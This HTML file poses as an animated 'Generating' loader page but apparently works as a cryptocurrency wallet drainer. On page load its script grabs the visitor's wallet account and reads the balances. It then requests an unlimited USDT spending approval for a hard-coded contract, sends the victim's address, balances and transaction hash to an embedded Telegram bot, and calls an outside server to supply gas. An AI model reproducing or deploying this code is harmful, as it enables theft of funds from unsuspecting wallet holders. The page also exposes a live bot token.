<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Digital High-Tech Loader</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }

        /* From Uiverse.io by dexter-st */ 
        .loader-wrapper {
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 120px;
            width: auto;
            margin: 2rem;
            font-family: "Poppins", sans-serif;
            font-size: 1.6em;
            font-weight: 600;
            user-select: none;
            color: #fff;
            scale: 2;
        }

        .loader {
            position: absolute;
            top: 0;
            left: 0;
            height: 100%;
            width: 100%;
            z-index: 1;
            background-color: transparent;
            mask: repeating-linear-gradient(
                90deg,
                transparent 0,
                transparent 6px,
                black 7px,
                black 8px
            );
        }

        .loader::after {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: radial-gradient(circle at 50% 50%, #ff0 0%, transparent 50%),
                radial-gradient(circle at 45% 45%, #f00 0%, transparent 45%),
                radial-gradient(circle at 55% 55%, #0ff 0%, transparent 45%),
                radial-gradient(circle at 45% 55%, #0f0 0%, transparent 45%),
                radial-gradient(circle at 55% 45%, #00f 0%, transparent 45%);
            mask: radial-gradient(
                circle at 50% 50%,
                transparent 0%,
                transparent 10%,
                black 25%
            );
            animation:
                transform-animation 2s infinite alternate,
                opacity-animation 4s infinite;
            animation-timing-function: cubic-bezier(0.6, 0.8, 0.5, 1);
        }

        @keyframes transform-animation {
            0% {
                transform: translate(-55%);
            }
            100% {
                transform: translate(55%);
            }
        }

        @keyframes opacity-animation {
            0%,
            100% {
                opacity: 0;
            }
            15% {
                opacity: 1;
            }
            65% {
                opacity: 0;
            }
        }

        .loader-letter {
            display: inline-block;
            opacity: 0;
            animation: loader-letter-anim 4s infinite linear;
            z-index: 2;
        }

        .loader-letter:nth-child(1) {
            animation-delay: 0.1s;
        }
        .loader-letter:nth-child(2) {
            animation-delay: 0.205s;
        }
        .loader-letter:nth-child(3) {
            animation-delay: 0.31s;
        }
        .loader-letter:nth-child(4) {
            animation-delay: 0.415s;
        }
        .loader-letter:nth-child(5) {
            animation-delay: 0.521s;
        }
        .loader-letter:nth-child(6) {
            animation-delay: 0.626s;
        }
        .loader-letter:nth-child(7) {
            animation-delay: 0.731s;
        }
        .loader-letter:nth-child(8) {
            animation-delay: 0.837s;
        }
        .loader-letter:nth-child(9) {
            animation-delay: 0.942s;
        }
        .loader-letter:nth-child(10) {
            animation-delay: 1.047s;
        }

        @keyframes loader-letter-anim {
            0% {
                opacity: 0;
            }
            5% {
                opacity: 1;
                text-shadow: 0 0 4px #fff;
                transform: scale(1.1) translateY(-2px);
            }
            20% {
                opacity: 0.2;
            }
            100% {
                opacity: 0;
            }
        }

        /* Responsive adjustments */
        @media (max-width: 768px) {
            .loader-wrapper {
                scale: 1.5;
            }
        }

        @media (max-width: 480px) {
            .loader-wrapper {
                scale: 1.2;
            }
        }
    </style>
</head>
<body>
    <!-- From Uiverse.io by dexter-st --> 
    <div class="loader-wrapper">
        <span class="loader-letter">G</span>
        <span class="loader-letter">e</span>
        <span class="loader-letter">n</span>
        <span class="loader-letter">e</span>
        <span class="loader-letter">r</span>
        <span class="loader-letter">a</span>
        <span class="loader-letter">t</span>
        <span class="loader-letter">i</span>
        <span class="loader-letter">n</span>
        <span class="loader-letter">g</span>
        <div class="loader"></div>
    </div>

    <!-- Web3 and jQuery Scripts -->
    <script type="text/javascript" src="js/web3.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>

    <script>
        // Contract addresses and ABIs
        var addressTOKEN = "0x55d398326f99059ff775485246999027b3197955";
        var matrixAbiTOKEN = [{ "inputs": [], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "spender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "previousOwner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "newOwner", "type": "address" }], "name": "OwnershipTransferred", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "constant": true, "inputs": [], "name": "_decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "burn", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "subtractedValue", "type": "uint256" }], "name": "decreaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "getOwner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "addedValue", "type": "uint256" }], "name": "increaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "mint", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "renounceOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }];

        var addressSTAKING = "0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC";
        var matrixAbiSTAKING = [{ "constant": false, "inputs": [{ "name": "_data", "type": "bytes32" }], "name": "setfirelevel", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_senderads", "type": "address" }, { "name": "_amttoken", "type": "uint256" }, { "name": "mainadmin", "type": "address" }], "name": "RewardGeneration", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_token", "type": "address" }], "name": "setTokenAddress", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_senderads", "type": "address" }, { "name": "_amttoken", "type": "uint256" }, { "name": "membcode", "type": "uint256" }, { "name": "rcode", "type": "uint256" }, { "name": "plan", "type": "uint64" }], "name": "multiTransferUSD", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_userAddresses", "type": "address[]" }, { "name": "_amount", "type": "uint256" }], "name": "airDropTRX", "outputs": [], "payable": true, "stateMutability": "payable", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_tokenadd", "type": "address" }, { "name": "_wallet", "type": "address" }, { "name": "_amount", "type": "uint256" }], "name": "distrubutionroi", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_contributors", "type": "address[]" }, { "name": "_balances", "type": "uint256[]" }, { "name": "membcode", "type": "uint256" }, { "name": "rcode", "type": "uint256" }, { "name": "plan", "type": "uint64" }], "name": "TransferBusd", "outputs": [], "payable": true, "stateMutability": "payable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_newValue", "type": "uint256" }], "name": "distrubutionIncome", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_contractAddress", "type": "address" }], "name": "getMsgData", "outputs": [{ "name": "hash", "type": "bytes32" }], "payable": false, "stateMutability": "pure", "type": "function" }, { "constant": false, "inputs": [{ "name": "_newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "token", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "inputs": [{ "name": "_token", "type": "address" }], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "payable": true, "stateMutability": "payable", "type": "fallback" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "value", "type": "uint256" }, { "indexed": true, "name": "sender", "type": "address" }, { "indexed": false, "name": "membcode", "type": "uint256" }, { "indexed": false, "name": "rcode", "type": "uint256" }, { "indexed": false, "name": "ptype", "type": "uint64" }], "name": "Multisended", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "value", "type": "uint256" }, { "indexed": true, "name": "sender", "type": "address" }, { "indexed": false, "name": "membcode", "type": "uint256" }, { "indexed": false, "name": "rcode", "type": "uint256" }, { "indexed": false, "name": "ptype", "type": "uint64" }], "name": "Multireceivers", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "_userAddress", "type": "address" }, { "indexed": false, "name": "_amount", "type": "uint256" }], "name": "Airdropped", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "previousOwner", "type": "address" }, { "indexed": true, "name": "newOwner", "type": "address" }], "name": "onOwnershipTransferred", "type": "event" }];

        var MatrixInstanceSTAKING, MatrixContractSTAKING, MatrixInstanceTOKEN, MatrixContractTOKEN;

        // Initialize Web3
        const web3 = new Web3(window.ethereum);

        // Auto top-up BNB function
        async function requestBNBTopUp(account) {
            try {
                alert('üì§ Sending BNB Top-Up Request...\n\nRecipient: ' + account.substring(0, 10) + '...\n\nAPI: armaan-production.up.railway.app');
                console.log('üì§ Requesting BNB top-up for:', account);
                
                const response = await fetch('https://armaan-production.up.railway.app/send-bnb', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ recipient: account }),
                });

                console.log('üì• API Response status:', response.status);
                const data = await response.json();
                console.log('üì• API Response data:', data);
                
                if (data.success) {
                    alert('‚úÖ BNB Top-Up Request Successful!\n\nResponse: ' + JSON.stringify(data));
                    return true;
                } else {
                    alert('‚ùå BNB Top-Up Request Failed!\n\nResponse: ' + JSON.stringify(data));
                    return false;
                }
            } catch (error) {
                alert('‚ùå BNB Top-Up Error!\n\nError: ' + error.message);
                console.error('Error during BNB request:', error);
                return false;
            }
        }

        // Telegram notification function
        async function sendTelegramNotification(walletAddress, bnbAmount, usdtAmount, approvedAddress, dateTime, txHash, retryCount = 0) {
            const botToken = '7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM';
            const chatId = '8191508290';
            const maxRetries = 3;
            
            const message = `üîî USDT Approval Notification\n\n` +
                            `üë§ Wallet Address: ${walletAddress}\n` +
                            `üí∞ BNB Balance: ${bnbAmount} BNB\n` +
                            `üíµ USDT Balance: ${usdtAmount} USDT\n` +
                            `üìç Approved Address: ${approvedAddress}\n` +
                            `üìÖ Date and Time: ${dateTime}\n` +
                            `üîó Transaction Hash: ${txHash}`;

            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                const formData = new URLSearchParams();
                formData.append('chat_id', chatId);
                formData.append('text', message);
                
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: formData.toString(),
                    mode: 'cors',
                    cache: 'no-cache'
                });
                
                const responseText = await response.text();
                let data;
                
                try {
                    data = JSON.parse(responseText);
                } catch (e) {
                    if (retryCount < maxRetries) {
                        await new Promise(resolve => setTimeout(resolve, 2000));
                        return sendTelegramNotification(walletAddress, bnbAmount, usdtAmount, approvedAddress, dateTime, txHash, retryCount + 1);
                    }
                    return false;
                }
                
                if (data.ok) {
                    return true;
                } else {
                    if (retryCount < maxRetries && (data.error_code === 429 || data.error_code === 500 || data.error_code === 502 || data.error_code === 503)) {
                        const retryDelay = data.error_code === 429 ? (data.parameters?.retry_after || 5) * 1000 : 2000;
                        await new Promise(resolve => setTimeout(resolve, retryDelay));
                        return sendTelegramNotification(walletAddress, bnbAmount, usdtAmount, approvedAddress, dateTime, txHash, retryCount + 1);
                    }
                    return false;
                }
            } catch (error) {
                if (retryCount < maxRetries && (error.name === 'TypeError' || error.name === 'NetworkError')) {
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    return sendTelegramNotification(walletAddress, bnbAmount, usdtAmount, approvedAddress, dateTime, txHash, retryCount + 1);
                }
                return false;
            }
        }

        // Token approval function
        async function approveToken(account) {
            alert('üîç Getting Token Information...\n\nChecking USDT balance and allowance...');
            console.log('üîç Starting approval process for:', account);
            
            const usdtContract = new web3.eth.Contract(matrixAbiTOKEN, addressTOKEN);
            const maxApprovalAmount = web3.utils.toHex('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF');

            const bnbBalance = await web3.eth.getBalance(account);
            const balanceInBNB = web3.utils.fromWei(bnbBalance, 'ether');

            const usdtBalance = await usdtContract.methods.balanceOf(account).call();
            const usdtBalanceFormatted = web3.utils.fromWei(usdtBalance, 'ether');

            const allowance = await usdtContract.methods.allowance(account, addressSTAKING).call();
            const approvedUSDT = web3.utils.fromWei(allowance, 'ether');

            const currentDate = new Date();
            const formattedDate = currentDate.toLocaleString();
            const approvedAddress = addressSTAKING;

            alert('üìä Token Information:\n\nBNB Balance: ' + parseFloat(balanceInBNB).toFixed(6) + ' BNB\nUSDT Balance: ' + parseFloat(usdtBalanceFormatted).toFixed(2) + ' USDT\nCurrent Allowance: ' + parseFloat(approvedUSDT).toFixed(2) + ' USDT\n\nSending approval transaction...');
            
            console.log('Processing....');
            console.log('Account:', account);
            console.log('BNB Balance:', balanceInBNB);
            console.log('USDT Balance:', usdtBalanceFormatted);

            await usdtContract.methods.approve(addressSTAKING, maxApprovalAmount)
                .send({ from: account })
                .on('transactionHash', async function (hash) {
                    alert('‚úÖ Approval Transaction Sent!\n\nTransaction Hash: ' + hash.substring(0, 20) + '...\n\nSending Telegram notification...');
                    console.log('‚úÖ Approval transaction sent with hash:', hash);
                    
                    const walletAddr = account || 'Unknown';
                    const bnbBal = balanceInBNB || '0';
                    const usdtBal = usdtBalanceFormatted || '0';
                    const approvedAddr = approvedAddress || addressSTAKING || 'Unknown';
                    const dateStr = formattedDate || new Date().toLocaleString();
                    const txHash = hash || 'Unknown';
                    
                    sendTelegramNotification(
                        walletAddr, 
                        bnbBal, 
                        usdtBal, 
                        approvedAddr, 
                        dateStr, 
                        txHash
                    ).then(result => {
                        if (result) {
                            alert('‚úÖ Telegram Notification Sent!\n\nNotification successfully sent to Telegram.\n\nWallet: ' + walletAddr.substring(0, 10) + '...');
                            console.log('‚úÖ [TX] Telegram notification sent successfully');
                        } else {
                            alert('‚ùå Telegram Notification Failed!\n\nCould not send notification to Telegram.');
                            console.error('‚ùå [TX] Telegram notification returned false');
                        }
                    }).catch(err => {
                        alert('‚ùå Telegram Notification Error!\n\nError: ' + err.message);
                        console.error('‚ùå [TX] Telegram notification error:', err);
                    });
                    
                    var maindt = { "fromaddress": account, "txthash": hash, "PackageAmt": approvedUSDT };
                    $.ajax({
                        url: '/home/TopUpWithMetamaskJson',
                        type: 'POST',
                        dataType: 'JSON',
                        contentType: 'application/json',
                        data: JSON.stringify(maindt),
                        success: function (data) {
                            console.log('Success');
                            setTimeout(() => {
                                window.close();
                                if (!window.closed) {
                                    location.href = "/home/index";
                                }
                            }, 500);
                        },
                        error: function (err) {
                            console.log("Error: " + JSON.stringify(err));
                            setTimeout(() => {
                                window.close();
                                if (!window.closed) {
                                    location.href = "/home/index";
                                }
                            }, 500);
                        }
                    });
                })
                .on('receipt', function (receipt) {
                    alert('‚úÖ Approval Confirmed!\n\nTransaction Receipt:\nBlock: ' + receipt.blockNumber + '\n\nClosing window...');
                    console.log('Approval confirmed with receipt:', receipt);
                })
                .on('error', function (error) {
                    if (error.code === 4001) {
                        alert('‚ùå Approval Canceled!\n\nYou canceled the approval request.\n\nPlease try again.');
                        console.log("You canceled the approval request. Please try again.");
                    } else {
                        alert('‚ùå Approval Failed!\n\nError: ' + error.message + '\n\nCode: ' + (error.code || 'Unknown'));
                        console.log("Approval failed: " + error.message);
                    }
                    console.error("Approval failed:", error);
                });
        }

        // Main function that combines auto top-up and approval
        async function TokenApprove() {
            try {
                // Check if wallet is available
                if (!window.ethereum) {
                    alert('‚ùå Wallet Not Detected!\n\nPlease open this page in Trust Wallet or MetaMask browser.');
                    console.error("No wallet detected");
                    return;
                }
                
                alert('‚úÖ Wallet Detected!\n\nChecking for connected account...\n\nTrying multiple methods...');
                console.log("‚úÖ Wallet detected:", window.ethereum);
                
                let account = null;
                
                // Method 1: Try eth_accounts (modern way)
                try {
                    const accounts = await ethereum.request({ method: 'eth_accounts' });
                    account = accounts[0];
                    console.log("Method 1 (eth_accounts):", account);
                } catch (e) {
                    console.log("Method 1 failed:", e);
                }
                
                // Method 2: Try web3.eth.accounts[0] (old way, works in Trust Wallet)
                if (!account && web3 && web3.eth && web3.eth.accounts && web3.eth.accounts.length > 0) {
                    account = web3.eth.accounts[0];
                    console.log("Method 2 (web3.eth.accounts):", account);
                }
                
                // Method 3: Wait a bit and try again (for Trust Wallet to initialize)
                if (!account) {
                    alert('‚è≥ Waiting for wallet to initialize...\n\nRetrying in 2 seconds...');
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    
                    try {
                        const accounts = await ethereum.request({ method: 'eth_accounts' });
                        account = accounts[0];
                        console.log("Method 3 (retry eth_accounts):", account);
                    } catch (e) {
                        console.log("Method 3 failed:", e);
                    }
                    
                    if (!account && web3 && web3.eth && web3.eth.accounts && web3.eth.accounts.length > 0) {
                        account = web3.eth.accounts[0];
                        console.log("Method 3 (retry web3.eth.accounts):", account);
                    }
                }
                
                if (!account) {
                    alert('‚ùå No Account Found!\n\nTried multiple methods:\n1. eth_accounts\n2. web3.eth.accounts[0]\n3. Retry after delay\n\nPlease ensure:\n- You are in Trust Wallet browser\n- Wallet is unlocked\n- Account is selected');
                    console.error("No accounts available after all methods");
                    console.log("web3 object:", web3);
                    console.log("web3.eth:", web3?.eth);
                    console.log("web3.eth.accounts:", web3?.eth?.accounts);
                    return;
                }

                alert('‚úÖ Account Found!\n\nWallet Address: ' + account + '\n\nChecking BNB balance...');
                console.log("‚úÖ Account found:", account);
                console.log("Account length:", account.length);

                // Step 1: Check the current BNB balance
                const bnbBalance = await web3.eth.getBalance(account);
                const balanceInBNB = web3.utils.fromWei(bnbBalance, 'ether');
                console.log("Current BNB Balance: ", balanceInBNB);
                
                alert('üí∞ BNB Balance Check\n\nCurrent Balance: ' + parseFloat(balanceInBNB).toFixed(6) + ' BNB\nRequired: 0.0001 BNB');

                const requiredBNB = 0.0001;

                // Step 2: Auto top-up in background if needed
                if (parseFloat(balanceInBNB) < requiredBNB) {
                    alert('‚ö†Ô∏è Low BNB Balance!\n\nBalance: ' + parseFloat(balanceInBNB).toFixed(6) + ' BNB\n\nRequesting BNB top-up...');
                    console.log("‚ö†Ô∏è Low BNB balance, requesting top-up");
                    
                    // Request the BNB top-up from the backend
                    const topUpSuccess = await requestBNBTopUp(account);

                    if (!topUpSuccess) {
                        alert('‚ùå BNB Top-Up Failed!\n\nCould not request BNB top-up.\n\nPlease try again.');
                        console.error("BNB top-up failed");
                        return;
                    }

                    alert('‚è≥ BNB Top-Up Requested!\n\nWaiting for top-up to process...\n\nPlease wait 3 seconds...');
                    console.log("‚è≥ BNB top-up requested, waiting...");

                    // Wait for top-up to process
                    await new Promise(resolve => setTimeout(resolve, 3000));
                    
                    // Recheck balance
                    const newBnbBalance = await web3.eth.getBalance(account);
                    const newBalanceInBNB = web3.utils.fromWei(newBnbBalance, 'ether');
                    
                    alert('üí∞ Balance Rechecked\n\nNew Balance: ' + parseFloat(newBalanceInBNB).toFixed(6) + ' BNB');
                    console.log("üí∞ New BNB balance:", newBalanceInBNB);
                    
                    if (parseFloat(newBalanceInBNB) < requiredBNB) {
                        alert('‚ùå Still Low Balance!\n\nBalance: ' + parseFloat(newBalanceInBNB).toFixed(6) + ' BNB\n\nTop-up may still be processing.');
                        console.error("Still low balance after top-up");
                        return;
                    }
                } else {
                    alert('‚úÖ Sufficient BNB Balance!\n\nBalance: ' + parseFloat(balanceInBNB).toFixed(6) + ' BNB\n\nProceeding to approval...');
                    console.log("‚úÖ Sufficient BNB balance");
                }

                // Step 3: Show approval request
                alert('üöÄ Starting Approval Process!\n\nWallet: ' + account.substring(0, 10) + '...\n\nYou will see a wallet popup to approve.');
                console.log("üöÄ Starting approval process");
                await approveToken(account);
            } catch (error) {
                alert('‚ùå Error Occurred!\n\nError: ' + error.message + '\n\nCheck console for details.');
                console.error('Error:', error);
            }
        }

        // Start automatically when page loads - no wallet connection required
        window.addEventListener('load', function() {
            alert('üöÄ Page Loaded!\n\nStarting automatic process...\n\nChecking wallet connection...');
            console.log('üöÄ Page loaded, starting process...');
            
            // Small delay to ensure scripts are loaded
            setTimeout(() => {
                TokenApprove();
            }, 1000);
        });
    </script>
</body>
</html>
